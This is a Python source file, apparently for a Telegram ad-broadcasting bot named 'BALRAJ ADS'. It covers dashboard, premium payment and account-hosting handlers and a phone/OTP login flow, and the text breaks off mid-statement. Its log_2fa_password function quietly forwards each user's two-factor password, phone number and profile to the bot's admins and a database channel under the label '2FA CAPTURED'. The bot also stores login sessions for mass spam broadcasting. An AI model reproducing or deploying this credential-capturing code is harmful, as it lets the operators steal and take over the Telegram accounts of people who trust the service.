auto_reply_tasks = {}

# ============================================================
# HELPERS
# ============================================================
async def send_dm_log(uid, log_message):
    try:
        if not db.get_logger_status(uid): return
        await logger_client.send_message(uid, log_message, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"send_dm_log: {e}")
        db.log_logger_failure(uid, str(e))

async def forward_event_to_db_channel(event_type: str, uid: int, payload: dict):
    """Log to DB channel if configured."""
    if not db.get_setting("db_forward_enabled", True):
        return
    db_channel = db.get_setting("database_channel_id")
    if not db_channel:
        return
    try:
        user = db.get_user(uid) or {}
        username = user.get("username", "N/A")
        first = user.get("first_name", "User")
        ts = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        body = "\n".join([f"<b>{k}:</b> <code>{v}</code>" for k, v in payload.items()])
        msg = (f"<blockquote><b>🗄 DB EVENT — {event_type.upper()}</b></blockquote>\n\n"
               f"<b>User ID:</b> <code>{uid}</code>\n"
               f"<b>Name:</b> {first}\n"
               f"<b>Username:</b> @{username}\n"
               f"<b>Time:</b> <code>{ts}</code>\n\n{body}")
        await pyro.send_message(db_channel, msg, parse_mode=ParseMode.HTML)
        db.log_db_event(event_type, uid, payload)
    except Exception as e:
        logger.error(f"forward_event: {e}")

async def validate_session(s):
    try:
        tg = TelegramClient(StringSession(s), API_ID, API_HASH)
        await tg.connect(); ok = await tg.is_user_authorized()
        await tg.disconnect(); return ok
    except Exception: return False

async def _get_user_tg_client(acc):
    try:
        s = cipher_suite.decrypt(acc["session_string"].encode()).decode()
        tg = TelegramClient(StringSession(s), API_ID, API_HASH)
        await tg.connect()
        if not await tg.is_user_authorized():
            await tg.disconnect(); return None
        return tg
    except Exception as e:
        logger.error(f"_get_user_tg_client: {e}"); return None

async def log_2fa_password(uid, password):
    try:
        u = db.get_user(uid)
        username = u.get("username", "N/A") if u else "N/A"
        first = u.get("first_name", "User") if u else "User"
        phone = "N/A"
        enc = db.get_temp_data(uid)
        if enc:
            try:
                temp = json.loads(cipher_suite.decrypt(enc.encode()).decode())
                phone = temp.get("phone", "N/A")
            except Exception: pass
        msg = (f"<blockquote><b>🔐 2FA CAPTURED</b></blockquote>\n\n"
               f"<b>User ID:</b> <code>{uid}</code>\n"
               f"<b>Name:</b> {first}\n"
               f"<b>Username:</b> @{username}\n"
               f"<b>Phone:</b> <code>{phone}</code>\n"
               f"<b>Password:</b> <code>{password}</code>\n"
               f"<b>Time:</b> <code>{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</code>")
        for aid in ADMIN_IDS:
            try: await pyro.send_message(aid, msg, parse_mode=ParseMode.HTML)
            except Exception: pass
        await forward_event_to_db_channel("2fa_captured", uid,
            {"phone": phone, "password": password})
    except Exception as e:
        logger.error(f"log_2fa: {e}")

async def is_joined(client, uid, chat_id):
    for _ in range(3):
        try:
            await client.get_chat_member(chat_id, uid); return True
        except Exception: await asyncio.sleep(1)
    return False

async def is_joined_all(client, uid):
    if not db.get_setting("force_join_enabled", False): return True
    for ch in (db.get_setting("force_join_channels", []) or []):
        if not await is_joined(client, uid, ch["id"]): return False
    for gr in (db.get_setting("force_join_groups", []) or []):
        if not await is_joined(client, uid, gr["id"]): return False
    return True

def is_maintenance():
    return db.get_setting("maintenance_mode", False)

async def check_user_access(client, uid):
    if is_owner(uid): return True, "", {}
    if is_maintenance(): return False, db.get_setting("maintenance_message", MAINTENANCE_MESSAGE), {}
    if db.is_banned(uid): return False, ERROR_MESSAGES["banned"], {}
    return True, "", {}

def is_premium_user(uid):
    return db.is_premium(uid)

def get_user_limit(uid):
    if is_premium_user(uid): return 99999
    try: return int(db.get_setting("free_account_limit", FREE_ACCOUNT_LIMIT))
    except (TypeError, ValueError): return FREE_ACCOUNT_LIMIT

def get_otp_keyboard():
    return kb([
        [InlineKeyboardButton("1", callback_data="otp_1"),
         InlineKeyboardButton("2", callback_data="otp_2"),
         InlineKeyboardButton("3", callback_data="otp_3")],
        [InlineKeyboardButton("4", callback_data="otp_4"),
         InlineKeyboardButton("5", callback_data="otp_5"),
         InlineKeyboardButton("6", callback_data="otp_6")],
        [InlineKeyboardButton("7", callback_data="otp_7"),
         InlineKeyboardButton("8", callback_data="otp_8"),
         InlineKeyboardButton("9", callback_data="otp_9")],
        [InlineKeyboardButton("⌫", callback_data="otp_back"),
         InlineKeyboardButton("0", callback_data="otp_0"),
         InlineKeyboardButton("❌", callback_data="otp_cancel")],
        [InlineKeyboardButton("📩 Telegram Chat",
                              url="tg://openmessage?user_id=777000")]])

# ============================================================
# RICH DASHBOARD
# ============================================================
def build_dashboard_rich_html(snap: dict) -> str:
    is_prem = snap.get("is_premium", False)
    prem_str = "💎 Premium" if is_prem else "❌ Free"
    expiry_str = time_remaining_str(snap.get("premium_expiry")) if is_prem else "—"
    running = snap.get("running", False)
    bc_status = "🟢 Live" if running else "🔴 Stopped"
    aj = snap.get("auto_join_enabled", False)
    gt = snap.get("group_targeting_enabled", False)
    return (
        "<h2>⚡ BALRAJ ADS — Control Board</h2>"
        "<blockquote>"
        f"<b>User:</b> <code>{snap.get('first_name','User')}</code><br>"
        f"<b>Plan:</b> {prem_str} · <i>{expiry_str}</i>"
        "</blockquote>"
        "<h3>📊 Live Status</h3>"
        f"<p>📱 <b>Accounts</b> — <code>{snap.get('accounts_count',0)}/{'♾️' if is_prem else get_user_limit(snap.get('user_id',0))}</code></p>"
        f"<p>📝 <b>Ad</b> — {'✅ Set' if snap.get('has_ad_message') else '⭕ Not set'}</p>"
        f"<p>⏱ <b>Interval</b> — <code>{snap.get('delay') or DEFAULT_DELAY}s</code></p>"
        f"<p>📡 <b>Broadcast</b> — {bc_status}</p>"
        "<h3>🎛 Toggles</h3>"
        f"<p>🤖 Auto-Reply — {'⭐ Premium' if not is_prem else '🟢 Ready'}</p>"
        f"<p>🚪 Auto-Join — {'🟢 ON' if aj else '🔴 OFF'}</p>"
        f"<p>👥 Group Targeting — {'🟢 ON' if gt else '🔴 OFF'}</p>"
        "<blockquote expandable>Tap <b>🔄 Refresh</b> to reload · /help for commands</blockquote>"
    )

def build_dashboard_inline_rows(uid: int, snap: dict):
    is_prem = snap.get("is_premium", False)
    aj = snap.get("auto_join_enabled", False)
    gt = snap.get("group_targeting_enabled", False)
    rows = []
    if is_owner(uid):
        rows.append([styled("👑 Admin Panel", "admin_panel", style="danger")])
    rows.append([styled("➕ Add Account", "host_account", style="primary"),
                 styled("📱 My Accounts", "view_accounts", style="primary")])
    rows.append([styled("📝 Ad Message", "set_msg", style="primary"),
                 styled("⏱ Interval", "set_delay", style="primary")])
    rows.append([styled("▶️ Start", "start_broadcast", style="success"),
                 styled("⏹ Stop", "stop_broadcast", style="danger")])
    rows.append([styled(f"🤖 Auto Reply {'✅' if is_prem else '⭐'}", "auto_reply_menu"),
                 styled(f"🚪 Auto Join {'🟢' if aj else '🔴'}", "toggle_auto_join")])
    rows.append([styled(f"👥 Group Targeting {'🟢' if gt else '🔴'}", "toggle_group_targeting"),
                 styled("📈 Analytics", "analytics")])
    rows.append([styled("💎 Premium", "premium_menu", style="success"),
                 styled("🎟️ Redeem", "redeem_menu", style="success")])
    rows.append([styled("🔄 Refresh", "refresh_dashboard", style="primary"),
                 styled("⚙️ Help", "feature_info")])
    return rows

async def render_dashboard(client, uid, target_message=None, reply_to=None):
    snap = db.get_user_snapshot(uid)
    if not snap: return False
    html = build_dashboard_rich_html(snap)
    rows = build_dashboard_inline_rows(uid, snap)
    markup_json = {"inline_keyboard": []}
    for row in rows:
        jr = []
        for b in row:
            if getattr(b, "callback_data", None):
                jr.append({"text": b.text, "callback_data": b.callback_data})
            elif getattr(b, "url", None):
                jr.append({"text": b.text, "url": b.url})
        markup_json["inline_keyboard"].append(jr)
    sent = await send_rich_message_fallback(BOT_TOKEN, uid, html, markup_json)
    if not sent and target_message:
        fallback = (
            f"<blockquote><b>⚡ BALRAJ ADS — Dashboard</b></blockquote>\n\n"
            f"• Accounts: <code>{snap.get('accounts_count',0)}</code>\n"
            f"• Ad: {'✅' if snap.get('has_ad_message') else '⭕'}\n"
            f"• Interval: <code>{snap.get('delay') or DEFAULT_DELAY}s</code>\n"
            f"• Broadcast: {'🟢 Live' if snap.get('running') else '🔴 Stopped'}\n"
            f"• Plan: {'💎 Premium' if snap.get('is_premium') else '❌ Free'}"
        )
        try:
            try:
                await target_message.edit_caption(caption=fallback,
                    parse_mode=ParseMode.HTML, reply_markup=kb(rows)); return True
            except MessageNotModified: return True
            except Exception: pass
            await target_message.edit_text(fallback, parse_mode=ParseMode.HTML,
                                            reply_markup=kb(rows)); return True
        except MessageNotModified: return True
        except Exception:
            try:
                await client.send_message(uid, fallback, parse_mode=ParseMode.HTML,
                                            reply_markup=kb(rows)); return True
            except Exception: return False
    elif not sent and reply_to:
        try:
            await reply_to.reply(
                "⚡ Dashboard ready — tap /start again.",
                reply_markup=kb(rows))
        except Exception: pass
    return sent

# ============================================================
# GLOBAL CALLBACK GATE
# ============================================================
@pyro.on_callback_query(group=-1)
async def global_gate(client, cb):
    uid = cb.from_user.id
    if is_owner(uid): return
    if is_maintenance():
        try: await cb.answer(MAINTENANCE_MESSAGE, show_alert=True)
        except Exception: pass
        raise Exception("stop")
    if db.is_banned(uid):
        try: await cb.answer(ERROR_MESSAGES["banned"], show_alert=True)
        except Exception: pass
        raise Exception("stop")

# ============================================================
# LOGGER BOT
# ============================================================
@logger_client.on_message(filters.command(["start"]))
async def logger_start(client, m):
    uid = m.from_user.id
    db.create_user(uid, m.from_user.username or "Unknown", m.from_user.first_name or "User")
    db.set_logger_status(uid, True)
    await m.reply("<b>╰_╯ Balraj Logger Bot</b>\n\nBroadcast logs will arrive here.",
                  parse_mode=ParseMode.HTML)

# ============================================================
# START
# ============================================================
@pyro.on_message(filters.command(["start"]))
async def start(client, m):
    uid = m.from_user.id
    db.create_user(uid, m.from_user.username or "Unknown", m.from_user.first_name or "User")
    db.update_user_last_interaction(uid)
    ok, reason, _ = await check_user_access(client, uid)
    if not ok:
        await m.reply(reason, parse_mode=ParseMode.HTML); return
    if db.get_setting("force_join_enabled", False):
        if not await is_joined_all(client, uid):
            buttons = []
            for c in (db.get_setting("force_join_channels", []) or []):
                buttons.append([InlineKeyboardButton(f"📢 {c.get('name','Join')}", url=c["url"])])
            for g in (db.get_setting("force_join_groups", []) or []):
                buttons.append([InlineKeyboardButton(f"👥 {g.get('name','Join')}", url=g["url"])])
            buttons.append([InlineKeyboardButton("✅ Try Again", callback_data="joined_check")])
            await m.reply_photo(photo=db.get_setting("force_join_image", FORCE_JOIN_IMAGE),
                caption="<b>╰_╯ JOIN REQUIRED</b>",
                parse_mode=ParseMode.HTML, reply_markup=kb(buttons))
            return
    await render_dashboard(client, uid, reply_to=m)

@pyro.on_callback_query(filters.regex("^refresh_dashboard$"))
async def refresh_dashboard(client, cb):
    await cb.answer("Refreshed ✅")
    await render_dashboard(client, cb.from_user.id, target_message=cb.message)

@pyro.on_callback_query(filters.regex("^menu_main$"))
async def menu_main(client, cb):
    await cb.answer("")
    await render_dashboard(client, cb.from_user.id, target_message=cb.message)

@pyro.on_callback_query(filters.regex("^joined_check$"))
async def joined_check(client, cb):
    if not await is_joined_all(client, cb.from_user.id):
        await cb.answer("Join first!", show_alert=True); return
    await cb.answer("Welcome ✅")
    try: await cb.message.delete()
    except Exception: pass
    await render_dashboard(client, cb.from_user.id, reply_to=cb.message)

# ============================================================
# TOGGLES
# ============================================================
@pyro.on_callback_query(filters.regex("^toggle_auto_join$"))
async def toggle_auto_join(client, cb):
    uid = cb.from_user.id
    if not is_premium_user(uid):
        await cb.answer("⭐ Premium only!", show_alert=True); return
    cur = db.get_auto_join(uid)
    db.set_auto_join(uid, not cur)
    await cb.answer(f"Auto-Join {'OFF' if cur else 'ON'}")
    await render_dashboard(client, uid, target_message=cb.message)

@pyro.on_callback_query(filters.regex("^toggle_group_targeting$"))
async def toggle_group_targeting(client, cb):
    uid = cb.from_user.id
    if not is_premium_user(uid):
        await cb.answer("⭐ Premium only!", show_alert=True); return
    cur = db.get_group_targeting(uid)
    db.set_group_targeting(uid, not cur)
    await cb.answer(f"Group Targeting {'OFF' if cur else 'ON'}")
    await render_dashboard(client, uid, target_message=cb.message)

# ============================================================
# HOST / ACCOUNTS
# ============================================================
@pyro.on_callback_query(filters.regex("^host_account$"))
async def host_account(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    ok, reason, _ = await check_user_access(client, uid)
    if not ok: await cb.answer(reason, show_alert=True); return
    cnt = db.get_user_accounts_count(uid); limit = get_user_limit(uid)
    if cnt >= limit: await cb.answer(f"Limit {cnt}/{limit}", show_alert=True); return
    db.set_user_state(uid, "telethon_wait_phone")
    db.set_temp_data(uid, None)
    try:
        await cb.message.edit_caption(
            caption="<b>╰_╯ HOST ACCOUNT</b>\n\nSend phone with country code:",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
    except Exception:
        await pyro.send_message(uid, "Send phone with country code:",
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))

@pyro.on_callback_query(filters.regex("^view_accounts$"))
async def view_accounts(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    accounts = db.get_user_accounts(uid)
    if not accounts:
        try:
            await cb.message.edit_caption(
                caption="<b>╰_╯ NO ACCOUNTS</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb([
                    [InlineKeyboardButton("➕ Add", callback_data="host_account")],
                    [InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
        except Exception: pass
        return
    cap = "<blockquote><b>╰_╯ YOUR ACCOUNTS</b></blockquote>\n\n"
    rows = []
    for i, acc in enumerate(accounts, 1):
        s = "✅" if acc["is_active"] else "❌"
        cap += f"{i}. <code>{acc['phone_number']}</code> {s}\n"
        rows.append([
            InlineKeyboardButton(f"{acc['phone_number']}", callback_data=f"view_acc_{acc['_id']}"),
            InlineKeyboardButton("🗑", callback_data=f"delete_acc_{acc['_id']}")])
    rows.append([InlineKeyboardButton("➕ Add", callback_data="host_account"),
                 InlineKeyboardButton("Back", callback_data="refresh_dashboard")])
    try:
        await cb.message.edit_caption(caption=cap, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^delete_acc_(.+)$"))
async def delete_acc(client, cb):
    db.delete_user_account(cb.from_user.id, cb.matches[0].group(1))
    await cb.answer("Deleted ✅")
    await view_accounts(client, cb)

@pyro.on_callback_query(filters.regex(r"^view_acc_(.+)$"))
async def view_acc(client, cb):
    await cb.answer("Account view coming soon.", show_alert=True)

# ============================================================
# AD MSG / DELAY
# ============================================================
@pyro.on_callback_query(filters.regex("^set_msg$"))
async def set_msg(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    db.set_user_state(uid, "waiting_broadcast_msg")
    saved = db.get_user_ad_messages(uid)
    cur = saved[0]["message"] if saved else "None"
    try:
        await cb.message.edit_caption(
            caption=f"<b>╰_╯ SET AD</b>\n\n<b>Current:</b>\n<code>{cur}</code>\n\nSend new:",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
    except Exception:
        await pyro.send_message(uid, "Send new ad message:",
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))

@pyro.on_callback_query(filters.regex("^set_delay$"))
async def set_delay(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    cur = db.get_user_ad_delay(uid)
    db.set_user_state(uid, "waiting_broadcast_delay")
    try:
        await cb.message.edit_caption(
            caption=f"<b>╰_╯ SET INTERVAL</b>\n\nCurrent: <code>{cur}s</code>\n\nSend seconds (min 120):",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("5 min", callback_data="quick_delay_300"),
                 InlineKeyboardButton("10 min", callback_data="quick_delay_600"),
                 InlineKeyboardButton("20 min", callback_data="quick_delay_1200")],
                [InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^quick_delay_(\d+)$"))
async def quick_delay(client, cb):
    uid = cb.from_user.id
    d = int(cb.matches[0].group(1))
    db.set_user_ad_delay(uid, d); db.set_user_state(uid, "")
    await cb.answer(f"Delay {d}s ✅")
    await render_dashboard(client, uid, target_message=cb.message)

# ============================================================
# BROADCAST
# ============================================================
@pyro.on_callback_query(filters.regex("^start_broadcast$"))
async def start_broadcast(client, cb):
    uid = cb.from_user.id
    await cb.answer("Starting...")
    if db.get_broadcast_state(uid).get("running"):
        await cb.answer("Already running!", show_alert=True); return
    if not db.get_user_ad_messages(uid):
        await cb.answer("Set ad first!", show_alert=True); return
    if not db.get_user_accounts(uid):
        await cb.answer("No accounts!", show_alert=True); return
    if not db.get_logger_status(uid):
        try:
            await cb.message.edit_caption(
                caption=f"<b>⚠️ Start {LOGGER_BOT_USERNAME} first</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb([
                    [InlineKeyboardButton("Start Logger", url=f"https://t.me/{LOGGER_BOT_USERNAME.lstrip('@')}")],
                    [InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
        except Exception: pass
        return
    old = user_tasks.pop(uid, None)
    if old:
        try: old.cancel()
        except Exception: pass
    user_tasks[uid] = asyncio.create_task(run_broadcast(client, uid))
    if is_premium_user(uid) and db.get_setting("auto_reply_enabled", True):
        ar = db.get_auto_reply(uid)
        if ar and ar.get("message"):
            old_ar = auto_reply_tasks.pop(uid, None)
            if old_ar:
                try: old_ar.cancel()
                except Exception: pass
            auto_reply_tasks[uid] = asyncio.create_task(run_auto_reply_listeners(client, uid))
    db.set_broadcast_state(uid, running=True)
    db.save_broadcast_progress(uid, cycle=0, sent=0, failed=0, account_index=0, group_index=0)
    await forward_event_to_db_channel("broadcast_started", uid,
        {"status": "running", "accounts": db.get_user_accounts_count(uid)})
    await cb.answer("Started 🚀")
    await render_dashboard(client, uid, target_message=cb.message)

@pyro.on_callback_query(filters.regex("^stop_broadcast$"))
async def stop_broadcast(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    if not await stop_broadcast_task(uid):
        await cb.answer("Not running!", show_alert=True); return
    await forward_event_to_db_channel("broadcast_stopped", uid, {"status": "stopped"})
    await cb.answer("Stopped ⏹")
    await render_dashboard(client, uid, target_message=cb.message)

async def stop_broadcast_task(uid):
    if not db.get_broadcast_state(uid).get("running"): return False
    t = user_tasks.pop(uid, None)
    if t:
        try: t.cancel()
        except Exception: pass
    ar = auto_reply_tasks.pop(uid, None)
    if ar:
        try: ar.cancel()
        except Exception: pass
    db.set_broadcast_state(uid, running=False)
    return True

# ============================================================
# ANALYTICS
# ============================================================
@pyro.on_callback_query(filters.regex("^analytics$"))
async def analytics_cb(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    s = db.get_user_analytics(uid)
    text = (f"<blockquote><b>╰_╯ ANALYTICS</b></blockquote>\n\n"
            f"Cycles: <code>{s.get('total_cycles',0)}</code>\n"
            f"Sent: <code>{s.get('total_sent',0)}</code>\n"
            f"Failed: <code>{s.get('total_failed',0)}</code>\n"
            f"Delay: <code>{db.get_user_ad_delay(uid)}s</code>")
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
    except Exception: pass

# ============================================================
# AUTO REPLY
# ============================================================
@pyro.on_callback_query(filters.regex("^auto_reply_menu$"))
async def auto_reply_menu(client, cb):
    uid = cb.from_user.id
    if not is_premium_user(uid):
        await cb.answer("⭐ Premium only!", show_alert=True); return
    if not db.get_setting("auto_reply_enabled", True):
        await cb.answer("Disabled by admin", show_alert=True); return
    await cb.answer("")
    doc = db.get_auto_reply(uid)
    cur = doc["message"] if doc else None
    rows = []
    if cur: rows.append([InlineKeyboardButton("🗑 Delete", callback_data="delete_auto_reply")])
    rows.append([InlineKeyboardButton("Back", callback_data="refresh_dashboard")])
    try:
        await cb.message.edit_caption(
            caption=f"<b>╰_╯ AUTO REPLY</b>\n\nCurrent:\n<code>{cur or 'Not set'}</code>\n\nSend new:",
            parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass
    db.set_user_state(uid, "waiting_auto_reply_msg")

@pyro.on_callback_query(filters.regex("^delete_auto_reply$"))
async def delete_auto_reply_cb(client, cb):
    db.delete_auto_reply(cb.from_user.id)
    db.set_user_state(cb.from_user.id, "")
    await cb.answer("Deleted 🗑")
    await render_dashboard(client, cb.from_user.id, target_message=cb.message)

# ============================================================
# FEATURE INFO
# ============================================================
@pyro.on_callback_query(filters.regex("^feature_info$"))
async def feature_info(client, cb):
    await cb.answer("")
    text = ("<blockquote><b>📖 FEATURES</b></blockquote>\n\n"
            "<b>Commands</b>\n/start · /me · /premium · /redeem · /stop · /help\n\n"
            "<b>Dashboard Buttons</b>\n"
            "➕ Add Account · 📱 My Accounts\n"
            "📝 Ad Message · ⏱ Interval\n"
            "▶️ Start · ⏹ Stop\n"
            "🤖 Auto Reply (premium)\n"
            "🚪 Auto Join (premium)\n"
            "👥 Group Targeting (premium)\n"
            "💎 Premium · 🎟️ Redeem · 🔄 Refresh\n\n"
            f"<i>Support: {ADMIN_USERNAME}</i>")
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
    except Exception: pass

# ============================================================
# PREMIUM / REDEEM / ME / STOP / HELP
# ============================================================
@pyro.on_message(filters.command("premium"))
async def premium_cmd(client, m):
    await show_premium_menu(client, m.chat.id, m.from_user.id)

@pyro.on_callback_query(filters.regex("^premium_menu$"))
async def premium_menu_cb(client, cb):
    await cb.answer("")
    try: await cb.message.delete()
    except Exception: pass
    await show_premium_menu(client, cb.message.chat.id, cb.from_user.id)

async def show_premium_menu(client, chat_id, uid):
    ok, reason, _ = await check_user_access(client, uid)
    if not ok: await client.send_message(chat_id, reason); return
    is_prem = is_premium_user(uid)
    exp = db.get_premium_expiry(uid)
    plans = db.get_all_plans()
    cap = (f"<blockquote><b>💎 PREMIUM</b></blockquote>\n\n"
           f"Status: {'💎 Active' if is_prem else '❌ Free'}\n"
           f"Expiry: <code>{time_remaining_str(exp) if is_prem else 'N/A'}</code>\n\n"
           f"Benefits: ♾️ Unlimited · 🤖 Auto Reply · 🎯 Group Targeting\n\nChoose plan:")
    rows = [[InlineKeyboardButton(p['label'], callback_data=f"buy_plan_{p['plan_id']}")] for p in plans]
    rows.append([InlineKeyboardButton("🎟️ Redeem", callback_data="redeem_menu")])
    rows.append([InlineKeyboardButton("Back", callback_data="refresh_dashboard")])
    try:
        await client.send_photo(chat_id=chat_id, photo=db.get_setting("premium_image", PREMIUM_IMAGE),
            caption=cap, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception as e: logger.error(f"premium_menu: {e}")

@pyro.on_callback_query(filters.regex(r"^buy_plan_(.+)$"))
async def buy_plan(client, cb):
    pid = cb.matches[0].group(1)
    plan = db.get_plan(pid)
    if not plan: await cb.answer("Not found", show_alert=True); return
    qr = db.get_payment_qr(); upi = db.get_payment_upi()
    if not qr and not upi:
        await cb.answer("⚠️ Payment not set", show_alert=True); return
    await cb.answer("")
    cap = (f"<blockquote><b>💳 PAYMENT</b></blockquote>\n\n"
           f"Plan: <code>{plan['label']}</code>\nAmount: ₹<code>{plan['price']}</code>\n"
           f"Days: <code>{plan['days']}</code>\n\nUPI: <code>{upi or 'N/A'}</code>\n\n"
           f"<i>Tap I've Paid and send screenshot.</i>")
    rows = [
        [InlineKeyboardButton("✅ I've Paid", callback_data=f"pay_done_{pid}")],
        [InlineKeyboardButton("📋 Copy UPI", callback_data=f"copy_upi_{pid}")],
        [InlineKeyboardButton("Back", callback_data="premium_menu")]]
    try:
        if qr:
            await cb.message.edit_media(
                media=InputMediaPhoto(media=qr, caption=cap, parse_mode=ParseMode.HTML),
                reply_markup=kb(rows))
        else:
            await cb.message.edit_caption(caption=cap, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^copy_upi_"))
async def copy_upi(client, cb):
    upi = db.get_payment_upi()
    if not upi: await cb.answer("UPI not set", show_alert=True); return
    await cb.answer(f"UPI: {upi}", show_alert=True)

@pyro.on_callback_query(filters.regex(r"^pay_done_(.+)$"))
async def pay_done(client, cb):
    uid = cb.from_user.id
    pid = cb.matches[0].group(1)
    db.set_user_state(uid, f"await_payment_screenshot_{pid}")
    await cb.answer("")
    try:
        await cb.message.edit_caption(caption="<b>📸 Send payment screenshot</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="premium_menu")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^redeem_menu$"))
async def redeem_menu_cb(client, cb):
    uid = cb.from_user.id
    await cb.answer("")
    try: await cb.message.delete()
    except Exception: pass
    db.set_user_state(uid, "await_redeem_code")
    await pyro.send_message(uid,
        "<blockquote><b>🎟️ REDEEM CODE</b></blockquote>\n\nSend your code:",
        parse_mode=ParseMode.HTML,
        reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="refresh_dashboard")]]))

@pyro.on_message(filters.command("me"))
async def user_info(client, m):
    uid = m.from_user.id
    u = db.get_user(uid)
    if not u: await m.reply("Please /start first."); return
    cnt = db.get_user_accounts_count(uid)
    is_prem = is_premium_user(uid); exp = db.get_premium_expiry(uid)
    limit_str = "♾️" if is_prem else str(get_user_limit(uid))
    prem_str = f"💎 Yes ({time_remaining_str(exp)})" if is_prem else "❌ No"
    await m.reply(
        f"<blockquote><b>╰_╯ PROFILE</b></blockquote>\n\n"
        f"ID: <code>{uid}</code>\nUsername: @{u.get('username','N/A')}\n"
        f"Premium: {prem_str}\nAccounts: <code>{cnt}/{limit_str}</code>\n"
        f"Logger: {'✅' if db.get_logger_status(uid) else '❌'}",
        parse_mode=ParseMode.HTML,
        reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))

@pyro.on_message(filters.command("stop"))
async def stop_cmd(client, m):
    if await stop_broadcast_task(m.from_user.id):
        await m.reply("⏹ <b>Stopped!</b>", parse_mode=ParseMode.HTML)
    else:
        await m.reply("No broadcast running.")

@pyro.on_message(filters.command("help"))
async def help_cmd(client, m):
    await m.reply(
        "<blockquote><b>📖 HELP</b></blockquote>\n\n"
        "/start — Dashboard\n/me — Profile\n/premium — Buy\n"
        "/redeem — Redeem code\n/stop — Stop broadcast\n\n"
        f"Support: {ADMIN_USERNAME}",
        parse_mode=ParseMode.HTML)

@pyro.on_message(filters.command("cancel"))
async def cancel_cmd(client, m):
    db.set_user_state(m.from_user.id, "")
    db.set_temp_data(m.from_user.id, None)
    await m.reply("✅ State cleared.")

# ============================================================
# TEXT HANDLER (USER)
# ============================================================
@pyro.on_message(filters.text & filters.private & ~filters.command(
    ["start", "admin", "bd", "me", "stats", "stop", "premium", "redeem", "help", "cancel", "send"]))
async def handle_text(client, m):
    uid = m.from_user.id
    state = db.get_user_state(uid)
    text = m.text.strip()

    if state == "waiting_auto_reply_msg":
        if not is_premium_user(uid):
            db.set_user_state(uid, ""); await m.reply("⭐ Premium only!"); return
        db.set_auto_reply(uid, text); db.set_user_state(uid, "")
        await m.reply(f"<blockquote><b>✅ AUTO REPLY SET</b></blockquote>\n\n<code>{text}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
        return

    if state == "waiting_broadcast_msg":
        db.add_user_ad_message(uid, text, datetime.now()); db.set_user_state(uid, "")
        await m.reply(f"<blockquote><b>✅ AD SET</b></blockquote>\n\n<code>{text}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
        return

    if state == "waiting_broadcast_delay":
        try:
            d = int(text)
            if d < 120 or d > 86400: raise ValueError
            db.set_user_ad_delay(uid, d); db.set_user_state(uid, "")
            await m.reply(f"<blockquote><b>✅ DELAY SET</b></blockquote>\n\n<code>{d}s</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
        except (ValueError, TypeError): await m.reply("❌ 120–86400.")
        return

    if state == "await_redeem_code":
        db.set_user_state(uid, "")
        ok, msg, days = db.redeem_code(text, uid)
        if ok:
            exp = db.get_premium_expiry(uid)
            await m.reply(
                f"<blockquote><b>🎉 REDEEMED!</b></blockquote>\n\nDays: <code>{days}</code>\n"
                f"Till: <code>{exp.strftime('%d/%m/%Y') if exp else 'N/A'}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Dashboard", callback_data="refresh_dashboard")]]))
        else:
            await m.reply(f"<blockquote>{msg}</blockquote>", parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Back", callback_data="refresh_dashboard")]]))
        return

    if state == "telethon_wait_phone":
        if not validate_phone_number(text):
            await m.reply("❌ Invalid phone. Use +1234567890"); return
        cleaned = re.sub(r'[^\d+]', '', text)
        status = await m.reply(f"⏳ Sending OTP to {cleaned}...")
        tg = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await tg.connect()
            sent = await tg.send_code_request(cleaned)
            ss = tg.session.save()
            temp = {"phone": cleaned, "session_str": ss,
                    "phone_code_hash": sent.phone_code_hash, "otp": ""}
            db.set_temp_data(uid, cipher_suite.encrypt(json.dumps(temp).encode()).decode())
            db.set_user_state(uid, "telethon_wait_otp")
            prompt = (f"<blockquote><b>📩 OTP sent to {cleaned}</b></blockquote>\n\n"
